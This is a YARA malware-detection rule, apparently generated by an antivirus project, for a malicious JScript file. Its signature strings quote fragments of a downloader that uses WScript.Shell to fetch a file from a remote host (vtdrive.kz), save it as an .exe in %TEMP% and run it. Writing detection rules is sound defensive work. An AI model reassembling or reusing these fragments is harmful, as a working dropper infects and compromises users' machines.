rule sig_20160330_28998972ccf4bda03a6b3bd3055fd662 {
  meta:
    description = "datamaliciousorder - file 20160330_28998972ccf4bda03a6b3bd3055fd662.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "28330b88df756ab4c5d70449911d3612dc54c8816d66ba8e3ebbe2c63aed7bbc"

  strings:
    $s1  = "var SH = function GX() {return WScript[M](\"WScript\"+\".Shell\");}(), PU = 11;" fullword ascii
    $s2  = "function QX(Q, WW0){Y0 = Y0 * 1; return Q - WW0;};" fullword ascii
    $s3  = "R[PK](\"GET\", \"http://vtdrive.kz/f6dh1a\", false);" fullword ascii
    $s4  = "if (R[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function RW(){return TR + \"\";};" fullword ascii
    $s6  = "function V() {return SH[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"5RZ22fVw0lXE.ex\" + \"e\";};" fullword ascii
    $s7  = "function L() {return ((FB == true) && (FB == K)) ? 1 : Y0;};" fullword ascii
    $s8  = "function H(UR){SH[\"Run\"](UR, Y0, Y0);};" fullword ascii
    $s9  = "function W(){return 22;};" fullword ascii
    $s10 = "var WW = new this[\"Date\"]();" fullword ascii
    $s11 = "function BW()" fullword ascii
    $s12 = "}while (C);" fullword ascii
    $s13 = "return QX(BD, W0);" fullword ascii
    $s14 = "function Y(){return M;};" fullword ascii
    $s15 = "function OY(VX) {var WS = (1, 2, 3, 4, 5, VX); return WS;};" fullword ascii
    $s16 = "K = true; " fullword ascii
    $s17 = "var K = false;" fullword ascii
    $s18 = "var FB = false;" fullword ascii
    $s19 = "var TC = false;" fullword ascii
    $s20 = "FB = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}